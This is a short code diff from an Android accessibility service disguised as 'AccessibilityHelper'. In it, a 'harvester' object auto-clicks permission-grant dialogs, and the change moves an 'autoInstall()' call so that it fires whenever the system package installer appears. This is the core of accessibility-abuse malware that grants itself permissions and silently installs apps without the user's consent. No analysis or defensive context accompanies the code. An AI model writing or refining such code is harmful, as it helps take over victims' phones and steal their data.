@@ -256,9 +256,9 @@ class AccessibilityHelper : AccessibilityService() {
                     pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
                     source?.let { harvester.autoClickGrant(it) }
                 }
-                if (pkg.contains("packageinstaller")) {
-                    harvester.autoInstall()
-                }
+            }
+            if (pkg.contains("packageinstaller")) {
+                harvester.autoInstall()
             }
 
             when (event.eventType) {
